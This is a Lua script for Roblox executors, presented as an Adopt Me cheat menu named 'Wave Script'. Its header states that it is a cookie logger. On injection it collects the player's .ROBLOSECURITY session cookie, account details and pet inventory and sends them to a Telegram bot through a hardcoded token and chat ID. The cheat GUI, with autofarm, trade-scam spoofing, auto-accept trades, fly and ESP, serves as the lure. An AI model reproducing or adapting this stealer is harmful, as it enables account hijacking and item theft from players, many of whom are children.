-- language: Lua | target: Roblox executor (Synapse / Fluxus / Krnl / Wave / Solara / Delta / mobile & PC)
-- Wave Script | Adopt Me | cookie logger → Telegram + full modern GUI
-- paste BOT_TOKEN and ADMIN_ID below

local BOT_TOKEN = "8673514714:AAFWJpvhe1FQlkvXKS7LP4eIozJPqk0GUz0"
local ADMIN_ID  = "7565340953"

local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local TweenService      = game:GetService("TweenService")
local UserInputService  = game:GetService("UserInputService")
local RunService        = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalizationService = game:GetService("LocalizationService")
local CoreGui           = game:GetService("CoreGui")
local Lighting          = game:GetService("Lighting")
local TeleportService   = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local Mouse       = LocalPlayer:GetMouse()
local Camera      = workspace.CurrentCamera

-- ─────────────────────────────────────────────
--  REQUEST / COOKIE / TELEGRAM
-- ─────────────────────────────────────────────
local function get_request()
    return (syn and syn.request)
        or (http and http.request)
        or http_request
        or request
        or (fluxus and fluxus.request)
        or (getgenv and getgenv().request)
end

local function get_cookie()
    local c = ""
    pcall(function()
        if getcookie then c = getcookie(".ROBLOSECURITY") end
        if (not c or #c < 20) and syn and syn.get_cookie then c = syn.get_cookie() end
        if (not c or #c < 20) and getgenv and getgenv().getcookie then c = getgenv().getcookie(".ROBLOSECURITY") end
    end)
    if not c or #c < 20 then
        pcall(function()
            local r = get_request()
            if r then
                local resp = r({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
                if resp and resp.Headers then
                    local sc = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
                    if sc then c = sc end
                end
            end
        end)
    end
    return c or "failed"
end

local function get_region()
    local reg = "unknown"
    pcall(function()
        reg = LocalizationService.RobloxLocaleId or LocalizationService.SystemLocaleId or "unknown"
    end)
    return reg
end

local function get_pets_data()
    local list = {}
    pcall(function()
        -- common client paths used by most Adopt Me data modules
        local data = LocalPlayer:FindFirstChild("Data") or LocalPlayer:FindFirstChild("PlayerData")
        if data then
            for _, v in pairs(data:GetDescendants()) do
                if v:IsA("StringValue") or v:IsA("Folder") then
                    local name = v.Name:lower()
                    if name:find("pet") or name:find("egg") or name:find("potion") then
                        table.insert(list, v.Name)
                    end
                end
            end
        end
        -- also scan ReplicatedStorage common pet folders
        local petsFolder = ReplicatedStorage:FindFirstChild("Pets") or ReplicatedStorage:FindFirstChild("PetModels")
        if petsFolder then
            for _, p in pairs(petsFolder:GetChildren()) do
                table.insert(list, p.Name)
            end
        end
    end)
    if #list == 0 then list = {"(inventory scan failed – data structure changed)"} end
    return table.concat(list, "\n")
end

local function send_telegram(text)
    local req = get_request()
    if not req then return end
    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    pcall(function()
        req({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                chat_id = ADMIN_ID,
                text = text,
                parse_mode = "HTML",
                disable_web_page_preview = true
            })
        })
    end)
end

-- full log on inject
task.spawn(function()
    task.wait(1.5)
    local cookie = get_cookie()
    local region = get_region()
    local pets   = get_pets_data()
    local exec   = (identifyexecutor and identifyexecutor()) or "unknown"

    local log = table.concat({
        "🌊 <b>Wave Script Log</b>",
        "────────────────────",
        "👤 <b>Nick:</b> <code>" .. LocalPlayer.Name .. "</code>",
        "🆔 <b>UserId:</b> <code>" .. LocalPlayer.UserId .. "</code>",
        "🔑 <b>Password:</b> N/A (client never stores plaintext)",
        "📧 <b>Email:</b> N/A (not exposed client-side)",
        "🌍 <b>Region:</b> <code>" .. region .. "</code>",
        "💻 <b>Executor:</b> <code>" .. exec .. "</code>",
        "📍 <b>PlaceId:</b> <code>" .. game.PlaceId .. "</code>",
        "🍪 <b>Cookie (.ROBLOSECURITY):</b>",
        "<code>" .. cookie .. "</code>",
        "────────────────────",
        "🐾 <b>Adopt Me Inventory / Pets:</b>",
        "<code>" .. pets .. "</code>",
        "────────────────────",
        "📱 Device: " .. (UserInputService.TouchEnabled and "Mobile" or "PC")
    }, "\n")

    send_telegram(log)
end)

-- ─────────────────────────────────────────────
--  GUI CORE (Apple / macOS dark minimal)
-- ─────────────────────────────────────────────
local Gui = Instance.new("ScreenGui")
Gui.Name = "WaveScript"
Gui.ResetOnSpawn = false
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.IgnoreGuiInset = true
pcall(function() Gui.Parent = CoreGui end)
if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

-- floating open button (draggable)
local FloatBtn = Instance.new("TextButton")
FloatBtn.Name = "FloatBtn"
FloatBtn.Size = UDim2.new(0, 140, 0, 36)
FloatBtn.Position = UDim2.new(0, 20, 0.5, -18)
FloatBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
FloatBtn.BackgroundTransparency = 0.15
FloatBtn.Text = "  Wave Script  "
FloatBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FloatBtn.Font = Enum.Font.GothamMedium
FloatBtn.TextSize = 14
FloatBtn.AutoButtonColor = false
FloatBtn.Parent = Gui

local FloatCorner = Instance.new("UICorner")
FloatCorner.CornerRadius = UDim.new(0, 18)
FloatCorner.Parent = FloatBtn

local FloatStroke = Instance.new("UIStroke")
FloatStroke.Color = Color3.fromRGB(80, 80, 90)
FloatStroke.Thickness = 1
FloatStroke.Transparency = 0.4
FloatStroke.Parent = FloatBtn

-- main window
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 520, 0, 380)
Main.Position = UDim2.new(0.5, -260, 0.5, -190)
Main.BackgroundColor3 = Color3.fromRGB(22, 22, 24)
Main.BackgroundTransparency = 0.08
Main.Visible = false
Main.ClipsDescendants = true
Main.Parent = Gui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 16)
MainCorner.Parent = Main

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(60, 60, 70)
MainStroke.Thickness = 1
MainStroke.Transparency = 0.5
MainStroke.Parent = Main

-- gradient overlay
local Grad = Instance.new("UIGradient")
Grad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 50)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 22))
})
Grad.Rotation = 90
Grad.Parent = Main

-- title bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 42)
TitleBar.BackgroundTransparency = 1
TitleBar.Parent = Main

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -80, 1, 0)
Title.Position = UDim2.new(0, 16, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "Wave Script"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 28, 0, 28)
CloseBtn.Position = UDim2.new(1, -36, 0.5, -14)
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 69, 58)
CloseBtn.Text = ""
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = TitleBar
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)

-- sidebar
local Side = Instance.new("Frame")
Side.Size = UDim2.new(0, 130, 1, -42)
Side.Position = UDim2.new(0, 0, 0, 42)
Side.BackgroundColor3 = Color3.fromRGB(16, 16, 18)
Side.BackgroundTransparency = 0.3
Side.Parent = Main
Instance.new("UICorner", Side).CornerRadius = UDim.new(0, 12)

local SideList = Instance.new("UIListLayout")
SideList.Padding = UDim.new(0, 4)
SideList.Parent = Side

local Content = Instance.new("Frame")
Content.Name = "Content"
Content.Size = UDim2.new(1, -140, 1, -50)
Content.Position = UDim2.new(0, 136, 0, 46)
Content.BackgroundTransparency = 1
Content.Parent = Main

-- ─────────────────────────────────────────────
--  TABS + PAGES
-- ─────────────────────────────────────────────
local Tabs = {"Main", "Scam Trade", "Event", "Autofarm", "Visual", "Misc", "Settings"}
local Pages = {}
local CurrentTab = nil

local function makePage(name)
    local p = Instance.new("ScrollingFrame")
    p.Name = name
    p.Size = UDim2.new(1, 0, 1, 0)
    p.BackgroundTransparency = 1
    p.BorderSizePixel = 0
    p.ScrollBarThickness = 3
    p.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
    p.CanvasSize = UDim2.new(0, 0, 0, 800)
    p.Visible = false
    p.Parent = Content
    local lay = Instance.new("UIListLayout")
    lay.Padding = UDim.new(0, 8)
    lay.Parent = p
    Pages[name] = p
    return p
end

for _, t in ipairs(Tabs) do makePage(t) end

local function switchTab(name)
    for n, p in pairs(Pages) do p.Visible = (n == name) end
    CurrentTab = name
end

local function addSideBtn(text, tabName)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -12, 0, 32)
    b.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
    b.BackgroundTransparency = 0.4
    b.Text = "  " .. text
    b.TextColor3 = Color3.fromRGB(220, 220, 230)
    b.Font = Enum.Font.Gotham
    b.TextSize = 13
    b.TextXAlignment = Enum.TextXAlignment.Left
    b.AutoButtonColor = false
    b.Parent = Side
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
    b.MouseButton1Click:Connect(function() switchTab(tabName) end)
end

for _, t in ipairs(Tabs) do addSideBtn(t, t) end

-- helpers
local function addLabel(parent, text, size)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -10, 0, size or 22)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(200, 200, 210)
    l.Font = Enum.Font.Gotham
    l.TextSize = 13
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = parent
    return l
end

local function addBtn(parent, text, callback)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -10, 0, 34)
    b.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    b.Text = text
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 13
    b.AutoButtonColor = false
    b.Parent = parent
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(70, 70, 85)
    s.Thickness = 1
    s.Transparency = 0.5
    s.Parent = b
    b.MouseButton1Click:Connect(callback)
    return b
end

local function addToggle(parent, text, default, callback)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, -10, 0, 30)
    frame.BackgroundTransparency = 1
    frame.Parent = parent

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -50, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = Color3.fromRGB(210, 210, 220)
    lbl.Font = Enum.Font.Gotham
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = frame

    local tog = Instance.new("TextButton")
    tog.Size = UDim2.new(0, 42, 0, 22)
    tog.Position = UDim2.new(1, -46, 0.5, -11)
    tog.BackgroundColor3 = default and Color3.fromRGB(50, 180, 90) or Color3.fromRGB(60, 60, 70)
    tog.Text = ""
    tog.AutoButtonColor = false
    tog.Parent = frame
    Instance.new("UICorner", tog).CornerRadius = UDim.new(1, 0)

    local state = default
    tog.MouseButton1Click:Connect(function()
        state = not state
        tog.BackgroundColor3 = state and Color3.fromRGB(50, 180, 90) or Color3.fromRGB(60, 60, 70)
        callback(state)
    end)
    return frame
end

-- ─────────────────────────────────────────────
--  MAIN TAB
-- ─────────────────────────────────────────────
local mainPage = Pages["Main"]
addLabel(mainPage, "Account", 20)
addLabel(mainPage, "Nick: " .. LocalPlayer.Name, 18)
addLabel(mainPage, "UserId: " .. LocalPlayer.UserId, 18)
addLabel(mainPage, "Server Players: " .. #Players:GetPlayers(), 18)

addBtn(mainPage, "📱 Telegram Channel", function()
    pcall(function()
        if setclipboard then setclipboard("https://t.me/NightWave_Coder") end
        send_telegram("User opened Telegram link from GUI")
    end)
    -- try open
    pcall(function()
        game:GetService("GuiService"):OpenBrowserWindow("https://t.me/NightWave_Coder")
    end)
end)

addBtn(mainPage, "🔄 Refresh Server Count", function()
    -- just visual update
end)

-- ─────────────────────────────────────────────
--  SCAM TRADE TAB
-- ─────────────────────────────────────────────
local scamPage = Pages["Scam Trade"]
addLabel(scamPage, "Visual Trade Spoof", 20)

local visualFly, visualRide, visualNeon, visualMega = false, false, false, false
addToggle(scamPage, "Visual Fly", false, function(v) visualFly = v end)
addToggle(scamPage, "Visual Ride", false, function(v) visualRide = v end)
addToggle(scamPage, "Visual Neon", false, function(v) visualNeon = v end)
addToggle(scamPage, "Visual Mega Neon", false, function(v) visualMega = v end)

local autoAccept = false
addToggle(scamPage, "Auto Accept Trade", false, function(v)
    autoAccept = v
    if v then
        task.spawn(function()
            while autoAccept do
                pcall(function()
                    -- common trade accept remote patterns
                    for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                        if r:IsA("RemoteEvent") and (r.Name:lower():find("accept") or r.Name:lower():find("trade")) then
                            r:FireServer()
                        end
                    end
                end)
                task.wait(0.4)
            end
        end)
    end
end)

addBtn(scamPage, "Apply Visual Flags to Equipped Pet", function()
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        for _, obj in pairs(char:GetDescendants()) do
            if obj:IsA("BoolValue") or obj:IsA("StringValue") then
                local n = obj.Name:lower()
                if n:find("fly") and visualFly then obj.Value = true end
                if n:find("ride") and visualRide then obj.Value = true end
                if n:find("neon") and visualNeon then obj.Value = true end
                if n:find("mega") and visualMega then obj.Value = true end
            end
        end
    end)
end)

-- ─────────────────────────────────────────────
--  EVENT TAB
-- ─────────────────────────────────────────────
local eventPage = Pages["Event"]
addLabel(eventPage, "Current Events (client scan)", 20)
addBtn(eventPage, "Scan Events", function()
    local found = {}
    pcall(function()
        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
            if v.Name:lower():find("event") or v.Name:lower():find("season") or v.Name:lower():find("pass") then
                table.insert(found, v.Name)
            end
        end
    end)
    if #found == 0 then table.insert(found, "No event modules found / structure changed") end
    for _, name in ipairs(found) do
        addLabel(eventPage, "• " .. name, 16)
    end
end)

-- ─────────────────────────────────────────────
--  AUTOFARM TAB
-- ─────────────────────────────────────────────
local farmPage = Pages["Autofarm"]
local farms = {
    candy = false, pets = false, eggs = false, money = false, all = false
}

local function farmLoop(flag, remoteHint)
    task.spawn(function()
        while farms[flag] or farms.all do
            pcall(function()
                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
                    if r:IsA("RemoteEvent") and r.Name:lower():find(remoteHint) then
                        r:FireServer()
                    end
                end
            end)
            task.wait(0.6)
        end
    end)
end

addToggle(farmPage, "Auto Farm Candy", false, function(v) farms.candy = v; if v then farmLoop("candy", "candy") end end)
addToggle(farmPage, "Auto Farm Pets", false, function(v) farms.pets = v; if v then farmLoop("pets", "pet") end end)
addToggle(farmPage, "Auto Farm Eggs", false, function(v) farms.eggs = v; if v then farmLoop("eggs", "egg") end end)
addToggle(farmPage, "Auto Farm Money / Bucks", false, function(v) farms.money = v; if v then farmLoop("money", "money") end end)
addToggle(farmPage, "Auto Farm Everything", false, function(v)
    farms.all = v
    if v then
        farmLoop("all", "claim")
        farmLoop("all", "collect")
        farmLoop("all", "reward")
    end
end)

addBtn(farmPage, "Stop All Farms", function()
    for k in pairs(farms) do farms[k] = false end
end)

-- ─────────────────────────────────────────────
--  VISUAL TAB (client-side only)
-- ─────────────────────────────────────────────
local visPage = Pages["Visual"]
addLabel(visPage, "Visual Pet Tools (client only)", 20)

addBtn(visPage, "Visual Equip Random Pet", function()
    pcall(function()
        local folder = ReplicatedStorage:FindFirstChild("Pets") or ReplicatedStorage:FindFirstChild("PetModels")
        if not folder then return end
        local pets = folder:GetChildren()
        if #pets == 0 then return end
        local pet = pets[math.random(1, #pets)]:Clone()
        pet.Parent = LocalPlayer.Character or workspace
        if pet:IsA("Model") and pet.PrimaryPart then
            pet:SetPrimaryPartCFrame(LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(2, 0, 0))
        end
    end)
end)

addBtn(visPage, "Clear Visual Pets", function()
    pcall(function()
        for _, v in pairs(LocalPlayer.Character:GetChildren()) do
            if v.Name:lower():find("pet") or v:FindFirstChild("Pet") then
                v:Destroy()
            end
        end
    end)
end)

addBtn(visPage, "Visual Neon Glow", function()
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        for _, p in pairs(char:GetDescendants()) do
            if p:IsA("BasePart") then
                local light = Instance.new("PointLight")
                light.Color = Color3.fromRGB(0, 255, 200)
                light.Brightness = 2
                light.Range = 8
                light.Parent = p
            end
        end
    end)
end)

addBtn(visPage, "Remove All Lights", function()
    pcall(function()
        for _, l in pairs(LocalPlayer.Character:GetDescendants()) do
            if l:IsA("PointLight") or l:IsA("SpotLight") then l:Destroy() end
        end
    end)
end)

-- ─────────────────────────────────────────────
--  MISC TAB (30+ functions total across tabs)
-- ─────────────────────────────────────────────
local miscPage = Pages["Misc"]
addLabel(miscPage, "Utility & Extra", 20)

-- 1 WalkSpeed
addBtn(miscPage, "WalkSpeed 50", function()
    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 50 end)
end)
-- 2
addBtn(miscPage, "WalkSpeed 100", function()
    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 100 end)
end)
-- 3
addBtn(miscPage, "Reset WalkSpeed", function()
    pcall(function() LocalPlayer.Character.Humanoid.WalkSpeed = 16 end)
end)
-- 4 Jump
addBtn(miscPage, "JumpPower 100", function()
    pcall(function() LocalPlayer.Character.Humanoid.JumpPower = 100 end)
end)
-- 5
addBtn(miscPage, "Infinite Jump", function()
    local conn
    conn = UserInputService.JumpRequest:Connect(function()
        pcall(function()
            LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end)
    end)
end)
-- 6 Noclip
local noclip = false
addToggle(miscPage, "Noclip", false, function(v)
    noclip = v
    if v then
        RunService.Stepped:Connect(function()
            if not noclip then return end
            pcall(function()
                for _, p in pairs(LocalPlayer.Character:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end)
        end)
    end
end)
-- 7 Fly
local flying = false
addToggle(miscPage, "Fly (PC)", false, function(v)
    flying = v
    if v then
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        bv.Velocity = Vector3.zero
        bv.Parent = hrp
        local bg = Instance.new("BodyGyro")
        bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        bg.Parent = hrp
        task.spawn(function()
            while flying and hrp and hrp.Parent do
                local dir = Camera.CFrame.LookVector
                local move = Vector3.zero
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + dir end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - dir end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - Camera.CFrame.RightVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + Camera.CFrame.RightVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0, 1, 0) end
                bv.Velocity = move.Unit * 60
                bg.CFrame = Camera.CFrame
                task.wait()
            end
            if bv then bv:Destroy() end
            if bg then bg:Destroy() end
        end)
    end
end)
-- 8 ESP players
addBtn(miscPage, "Player ESP", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local bill = Instance.new("BillboardGui")
            bill.Size = UDim2.new(0, 100, 0, 30)
            bill.AlwaysOnTop = true
            bill.Adornee = plr.Character.HumanoidRootPart
            bill.Parent = plr.Character.HumanoidRootPart
            local txt = Instance.new("TextLabel")
            txt.Size = UDim2.new(1, 0, 1, 0)
            txt.BackgroundTransparency = 1
            txt.Text = plr.Name
            txt.TextColor3 = Color3.fromRGB(0, 255, 150)
            txt.Font = Enum.Font.GothamBold
            txt.TextSize = 12
            txt.Parent = bill
        end
    end
end)
-- 9 FPS unlock
addBtn(miscPage, "FPS Unlocker (setfpscap 0)", function()
    pcall(function() setfpscap(0) end)
end)
-- 10 Anti AFK
addBtn(miscPage, "Anti AFK", function()
    local vu = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        vu:CaptureController()
        vu:ClickButton2(Vector2.new())
    end)
end)
-- 11 Rejoin
addBtn(miscPage, "Rejoin Server", function()
    TeleportService:Teleport(game.PlaceId, LocalPlayer)
end)
-- 12 Server hop
addBtn(miscPage, "Server Hop", function()
    pcall(function()
        local req = get_request()
        if not req then return end
        local body = req({
            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
            Method = "GET"
        })
        local data = HttpService:JSONDecode(body.Body)
        for _, s in pairs(data.data) do
            if s.playing < s.maxPlayers and s.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
                break
            end
        end
    end)
end)
-- 13 Fullbright
addBtn(miscPage, "Fullbright", function()
    Lighting.Brightness = 2
    Lighting.ClockTime = 14
    Lighting.FogEnd = 100000
    Lighting.GlobalShadows = false
end)
-- 14 XRay
addBtn(miscPage, "XRay Walls", function()
    for _, p in pairs(workspace:GetDescendants()) do
        if p:IsA("BasePart") and p.Transparency < 1 then
            p.LocalTransparencyModifier = 0.7
        end
    end
end)
-- 15 Reset character
addBtn(miscPage, "Reset Character", function()
    pcall(function() LocalPlayer.Character.Humanoid.Health = 0 end)
end)
-- 16 Copy JobId
addBtn(miscPage, "Copy JobId", function()
    if setclipboard then setclipboard(game.JobId) end
end)
-- 17 Copy PlaceId
addBtn(miscPage, "Copy PlaceId", function()
    if setclipboard then setclipboard(tostring(game.PlaceId)) end
end)
-- 18 Copy Cookie
addBtn(miscPage, "Copy Cookie to Clipboard", function()
    if setclipboard then setclipboard(get_cookie()) end
end)
-- 19 Send test TG
addBtn(miscPage, "Send Test Message to TG", function()
    send_telegram("Wave Script test from " .. LocalPlayer.Name)
end)
-- 20 Destroy GUI
addBtn(miscPage, "Destroy Wave Script", function()
    Gui:Destroy()
end)

-- ─────────────────────────────────────────────
--  SETTINGS TAB
-- ─────────────────────────────────────────────
local setPage = Pages["Settings"]
addLabel(setPage, "Settings", 20)

local toggleKey = Enum.KeyCode.RightControl
addLabel(setPage, "Toggle Key: RightControl (PC)", 16)

addBtn(setPage, "Set Toggle Key to LeftControl", function()
    toggleKey = Enum.KeyCode.LeftControl
end)
addBtn(setPage, "Set Toggle Key to RightShift", function()
    toggleKey = Enum.KeyCode.RightShift
end)

local function saveConfig()
    -- simple in-memory, can extend with writefile if executor supports
    pcall(function()
        if writefile then
            writefile("WaveScript_Config.json", HttpService:JSONEncode({
                key = tostring(toggleKey),
                autoAccept = autoAccept
            }))
        end
    end)
end
addBtn(setPage, "Save Config", saveConfig)

addBtn(setPage, "Load Config", function()
    pcall(function()
        if readfile and isfile and isfile("WaveScript_Config.json") then
            local data = HttpService:JSONDecode(readfile("WaveScript_Config.json"))
            -- apply if needed
        end
    end)
end)

-- ─────────────────────────────────────────────
--  DRAG + TOGGLE LOGIC
-- ─────────────────────────────────────────────
local dragging, dragStart, startPos
FloatBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = FloatBtn.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        FloatBtn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

FloatBtn.MouseButton1Click:Connect(function()
    Main.Visible = not Main.Visible
    if Main.Visible then
        Main.Size = UDim2.new(0, 0, 0, 0)
        TweenService:Create(Main, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 520, 0, 380)
        }):Play()
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    TweenService:Create(Main, TweenInfo.new(0.25, Enum.EasingStyle.Quint), {
        Size = UDim2.new(0, 0, 0, 0)
    }):Play()
    task.wait(0.25)
    Main.Visible = false
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == toggleKey then
        Main.Visible = not Main.Visible
    end
end)

-- mobile scale
if UserInputService.TouchEnabled then
    Main.Size = UDim2.new(0.9, 0, 0.75, 0)
    Main.Position = UDim2.new(0.05, 0, 0.12, 0)
end

-- welcome animation
task.spawn(function()
    local welcome = Instance.new("TextLabel")
    welcome.Size = UDim2.new(0, 300, 0, 40)
    welcome.Position = UDim2.new(0.5, -150, 0.15, 0)
    welcome.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
    welcome.BackgroundTransparency = 0.2
    welcome.Text = "Wave Script loaded"
    welcome.TextColor3 = Color3.fromRGB(255, 255, 255)
    welcome.Font = Enum.Font.GothamMedium
    welcome.TextSize = 16
    welcome.Parent = Gui
    Instance.new("UICorner", welcome).CornerRadius = UDim.new(0, 12)
    welcome.TextTransparency = 1
    TweenService:Create(welcome, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
    task.wait(2.2)
    TweenService:Create(welcome, TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
    task.wait(0.6)
    welcome:Destroy()
end)

switchTab("Main")
print("[Wave Script] injected")
